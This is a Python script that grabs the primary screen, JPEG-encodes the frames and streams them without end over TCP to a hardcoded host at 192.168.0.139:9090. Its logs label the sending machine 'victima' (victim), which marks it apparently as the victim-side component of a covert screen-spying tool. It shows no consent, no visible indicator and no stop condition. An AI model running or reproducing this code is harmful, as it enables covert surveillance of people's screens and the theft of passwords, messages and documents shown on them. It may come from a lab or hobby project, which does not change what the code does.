import struct
import time
import socket
import numpy as np
import logging

from cv2 import cv2
from mss import mss


logFormatter = logging.Formatter(
    '%(asctime)s.%(msecs)d %(message)s',
    datefmt='%Y-%m-%dT%H:%M:%S',
)
LOGGER = logging.getLogger()
LOGGER.setLevel(logging.INFO)

fileHandler = logging.FileHandler('logs/screen_share_victima.log', mode='w')
fileHandler.setFormatter(logFormatter)
LOGGER.addHandler(fileHandler)

consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(logFormatter)
LOGGER.addHandler(consoleHandler)

FRAME_NUM = 0


def check_time(func):
    def wrapper(*args, **kwargs):
        start = time.time()
        return_value = func(*args, **kwargs)
        end = time.time()

        LOGGER.info(f'victima:{func.__name__}:{(end - start) * 100:.2f}ms:{FRAME_NUM}')

        return return_value
    return wrapper


@check_time
def grab_screen():
    with mss() as sct:
        frame = sct.grab(sct.monitors[1])

    return frame


@check_time
def process_frame(frame):
    frame_arr = np.array(frame)
    resized_frame_arr = cv2.resize(frame_arr, (1200, 720), interpolation=cv2.INTER_AREA)
    _, encoded_frame_arr = cv2.imencode('.jpg', resized_frame_arr)
    return encoded_frame_arr.tobytes()


@check_time
def send_frame(conn, frame):
    frame_size = len(frame)
    conn.sendall(struct.pack('>Q', frame_size) + frame)


def share_screen(conn):
    while True:
        frame = grab_screen()
        frame_bytes = process_frame(frame)
        send_frame(conn, frame_bytes)


def main(host='192.168.0.139', port=9090):
    sock = socket.socket()
    sock.connect((host, port))
    try:
        share_screen(sock)
    finally:
        sock.close()


if __name__ == '__main__':
    main()
